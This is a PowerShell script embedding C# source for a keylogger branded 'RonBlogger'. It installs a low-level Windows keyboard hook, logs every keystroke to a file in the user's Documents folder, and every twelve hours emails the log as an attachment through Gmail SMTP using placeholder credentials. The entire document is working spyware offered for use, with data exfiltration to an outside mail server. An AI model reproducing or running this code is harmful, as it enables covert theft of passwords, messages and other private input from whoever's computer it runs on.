Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using System.Net.Mail;
using System.Timers;

namespace KL
{
    public static class Program
    {
        private static string logFilePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments), "Log.txt");
        private static System.Timers.Timer timer;

        private static HookProc hookProc = HookCallback;
        private static IntPtr hookId = IntPtr.Zero;

        public static void Main()
        {
            Console.WriteLine("RonBlogger by @ronbhack ;)");

            hookId = SetHook(hookProc);
            Application.Run();

            UnhookWindowsHookEx(hookId);
            timer.Stop();
        }

        private static IntPtr SetHook(HookProc hookProc)
        {
            IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
            return SetWindowsHookEx(13, hookProc, moduleHandle, 0);
        }

        private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && wParam == (IntPtr)0x0100)
            {
                int vkCode = Marshal.ReadInt32(lParam);
                string key = ((Keys)vkCode).ToString();
                if (key.Length > 1)
                    key = string.Format("[{0}] ", key);

                File.AppendAllText(logFilePath, key);

                if (timer == null)
                {
                    timer = new System.Timers.Timer(12 *60* 60 * 1000); // 12 horas en milisegundos
                    timer.Elapsed += TimerElapsed;
                    timer.AutoReset = true;
                    timer.Start();
                }
            }
            return CallNextHookEx(hookId, nCode, wParam, lParam);
        }

        private static void TimerElapsed(object sender, ElapsedEventArgs e)
        {
            if (File.Exists(logFilePath) && new FileInfo(logFilePath).Length > 0)
            {
                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress("tucorreo@gmail.com");
                    mail.To.Add("destinatario@gmail.com");
                    mail.Subject = "Archivo de registro de teclas";
                    mail.Body = "Adjunto encontrarás el archivo de registro de teclas.";
                    mail.Attachments.Add(new Attachment(logFilePath));

                    using (SmtpClient smtp = new SmtpClient("smtp.gmail.com", 587))
                    {
                        smtp.Credentials = new System.Net.NetworkCredential("tucorreo@gmail.com", "tupassword");
                        smtp.EnableSsl = true;
                        smtp.Send(mail);
                    }
                }
            }
        }

        [DllImport("user32.dll")]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);
    }
}
"@ -ReferencedAssemblies System.Windows.Forms

[KL.Program]::Main();